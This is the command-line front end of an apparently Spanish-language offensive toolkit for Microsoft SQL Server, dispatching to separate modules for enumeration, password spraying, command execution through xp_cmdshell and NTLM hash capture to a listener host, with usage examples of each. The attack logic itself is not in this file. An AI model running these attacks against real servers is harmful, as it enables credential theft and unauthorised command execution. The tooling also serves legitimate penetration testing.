#!/usr/bin/env python3
# tools/mssql/main.py
"""
lobera-mssql — Enumeración y ataque sobre Microsoft SQL Server.

Subcomandos:
  enum    Información de versión del servidor MSSQL
  dbs     Enumerar bases de datos disponibles
  spray   Password spray contra MSSQL
  xpcmd   Ejecutar comandos mediante xp_cmdshell
  ntlm    Capturar hash NTLM del servidor MSSQL

Uso:
  lobera-mssql enum   -t 10.0.0.1 -u sa -p contraseña
  lobera-mssql dbs    -t 10.0.0.1 -u sa -p contraseña
  lobera-mssql spray  -t 10.0.0.1 -U usuarios.txt -P passwords.txt
  lobera-mssql xpcmd  -t 10.0.0.1 -u sa -p contraseña -c whoami
  lobera-mssql ntlm   -t 10.0.0.1 -u sa -p contraseña --listener 10.0.0.5

by mitr0kerb
"""

import sys
import os
import argparse

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from core.output import console
from core.session_db import init_db


# ──────────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────────

def _leer_lista(fichero, valor_unico):
    if fichero:
        try:
            with open(fichero) as f:
                return [l.strip() for l in f if l.strip()]
        except OSError as e:
            console.print(f"[red]No se puede leer {fichero}: {e}[/red]")
            return []
    if valor_unico:
        return [valor_unico]
    return []


# ──────────────────────────────────────────────────────────────────────────────
# Subcomando: enum
# ──────────────────────────────────────────────────────────────────────────────

def cmd_enum(args):
    console.print(f"\n[bold cyan][ MSSQL ENUM ] {args.target}[/bold cyan]")
    try:
        from scripts.mssql.enum.version_enum import run
        run(
            target=args.target,
            port=args.port,
            user=args.user or '',
            password=args.password or '',
            database=args.database or '',
            timeout=args.timeout,
        )
    except ImportError as e:
        console.print(f"[red]Dependencia no disponible: {e}[/red]")


# ──────────────────────────────────────────────────────────────────────────────
# Subcomando: dbs
# ──────────────────────────────────────────────────────────────────────────────

def cmd_dbs(args):
    console.print(f"\n[bold cyan][ MSSQL DBS ] {args.target}[/bold cyan]")
    try:
        from scripts.mssql.enum.db_enum import run
        run(
            target=args.target,
            port=args.port,
            user=args.user or '',
            password=args.password or '',
            timeout=args.timeout,
        )
    except ImportError as e:
        console.print(f"[red]Dependencia no disponible: {e}[/red]")


# ──────────────────────────────────────────────────────────────────────────────
# Subcomando: spray
# ──────────────────────────────────────────────────────────────────────────────

def cmd_spray(args):
    console.print(f"\n[bold cyan][ MSSQL SPRAY ] {args.target}[/bold cyan]")

    usuarios  = _leer_lista(args.user_list, args.user)
    passwords = _leer_lista(args.pass_list, args.password)
    if not usuarios:
        console.print("[red]Necesitas -u <usuario> o -U <fichero>.[/red]")
        return
    if not passwords:
        console.print("[red]Necesitas -p <contraseña> o -P <fichero>.[/red]")
        return

    try:
        from scripts.mssql.attack.password_spray import run
        encontrados = run(
            target=args.target,
            port=args.port,
            usuarios=usuarios,
            passwords=passwords,
            delay=args.delay,
            timeout=args.timeout,
        )
        for cred in encontrados:
            console.print(f"  [green]✓[/green] {cred['user']} : {cred['password']}")
    except ImportError as e:
        console.print(f"[red]Dependencia no disponible: {e}[/red]")


# ──────────────────────────────────────────────────────────────────────────────
# Subcomando: xpcmd
# ──────────────────────────────────────────────────────────────────────────────

def cmd_xpcmd(args):
    console.print(f"\n[bold cyan][ MSSQL XPCMD ] {args.target}[/bold cyan]")
    try:
        from scripts.mssql.attack.xp_cmdshell import run
        run(
            target=args.target,
            port=args.port,
            user=args.user or '',
            password=args.password or '',
            cmd=args.cmd,
            timeout=args.timeout,
        )
    except ImportError as e:
        console.print(f"[red]Dependencia no disponible: {e}[/red]")


# ──────────────────────────────────────────────────────────────────────────────
# Subcomando: ntlm
# ──────────────────────────────────────────────────────────────────────────────

def cmd_ntlm(args):
    console.print(f"\n[bold cyan][ MSSQL NTLM ] {args.target}[/bold cyan]")
    try:
        from scripts.mssql.attack.ntlm_steal import run
        run(
            target=args.target,
            port=args.port,
            user=args.user or '',
            password=args.password or '',
            listener=args.listener,
            timeout=args.timeout,
        )
    except ImportError as e:
        console.print(f"[red]Dependencia no disponible: {e}[/red]")


# ──────────────────────────────────────────────────────────────────────────────
# CLI
# ──────────────────────────────────────────────────────────────────────────────

def _parser_comun(sub):
    sub.add_argument('-t', '--target', required=True, metavar='IP')
    sub.add_argument('--port', type=int, default=1433, metavar='PUERTO',
                     help='Puerto MSSQL (default: 1433)')
    sub.add_argument('-u', '--user', metavar='USUARIO')
    sub.add_argument('-p', '--password', metavar='CONTRASEÑA')
    sub.add_argument('--timeout', type=int, default=10)


def build_parser():
    parser = argparse.ArgumentParser(
        prog='lobera-mssql',
        description='Enumeración y ataque Microsoft SQL Server — lobera',
    )
    subs = parser.add_subparsers(dest='subcomando', required=True)

    # ── enum ──────────────────────────────────────────────────────────────────
    p_enum = subs.add_parser('enum', help='Información de versión del servidor MSSQL')
    _parser_comun(p_enum)
    p_enum.add_argument('-d', '--database', metavar='BASE_DATOS', default='',
                        help='Base de datos a conectar')
    p_enum.set_defaults(func=cmd_enum)

    # ── dbs ───────────────────────────────────────────────────────────────────
    p_dbs = subs.add_parser('dbs', help='Enumerar bases de datos disponibles')
    _parser_comun(p_dbs)
    p_dbs.set_defaults(func=cmd_dbs)

    # ── spray ─────────────────────────────────────────────────────────────────
    p_spray = subs.add_parser('spray', help='Password spray contra MSSQL')
    p_spray.add_argument('-t', '--target', required=True, metavar='IP')
    p_spray.add_argument('--port', type=int, default=1433, metavar='PUERTO')
    p_spray.add_argument('-u', '--user', metavar='USUARIO')
    p_spray.add_argument('-U', '--user-list', metavar='FICHERO',
                         help='Fichero con lista de usuarios')
    p_spray.add_argument('-p', '--password', metavar='CONTRASEÑA')
    p_spray.add_argument('-P', '--pass-list', metavar='FICHERO',
                         help='Fichero con lista de contraseñas')
    p_spray.add_argument('--delay', type=float, default=0.5, metavar='SEGUNDOS')
    p_spray.add_argument('--timeout', type=int, default=10)
    p_spray.set_defaults(func=cmd_spray)

    # ── xpcmd ─────────────────────────────────────────────────────────────────
    p_xpcmd = subs.add_parser('xpcmd', help='Ejecutar comandos mediante xp_cmdshell')
    _parser_comun(p_xpcmd)
    p_xpcmd.add_argument('-c', '--cmd', required=True, metavar='COMANDO',
                         help='Comando a ejecutar en el servidor')
    p_xpcmd.set_defaults(func=cmd_xpcmd)

    # ── ntlm ──────────────────────────────────────────────────────────────────
    p_ntlm = subs.add_parser('ntlm', help='Capturar hash NTLM del servidor MSSQL')
    _parser_comun(p_ntlm)
    p_ntlm.add_argument('--listener', required=True, metavar='IP',
                        help='IP del listener para capturar el hash NTLM')
    p_ntlm.set_defaults(func=cmd_ntlm)

    return parser


def _banner():
    from tools.common import banner, tabla_modos, ejemplos
    banner("lobera-mssql")
    tabla_modos([
        ("enum",   "Información de versión del servidor MSSQL"),
        ("dbs",    "Enumerar bases de datos disponibles"),
        ("spray",  "Password spray contra MSSQL"),
        ("xpcmd",  "Ejecutar comandos mediante xp_cmdshell"),
        ("ntlm",   "Capturar hash NTLM del servidor MSSQL"),
    ])
    ejemplos([
        "lobera-mssql enum   -t 10.10.10.5 -u sa -p Pass123",
        "lobera-mssql dbs    -t 10.10.10.5 -u sa -p Pass123",
        "lobera-mssql spray  -t 10.10.10.5 -U usuarios.txt -P passwords.txt",
        "lobera-mssql xpcmd  -t 10.10.10.5 -u sa -p Pass123 -c whoami",
        "lobera-mssql ntlm   -t 10.10.10.5 -u sa -p Pass123 --listener 10.10.10.1",
    ])


def main():
    import sys
    init_db()
    if not sys.argv[1:]:
        _banner()
        return
    parser = build_parser()
    args = parser.parse_args()
    try:
        args.func(args)
    except KeyboardInterrupt:
        console.print("\n[dim]Interrumpido.[/dim]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        sys.exit(1)


if __name__ == '__main__':
    main()
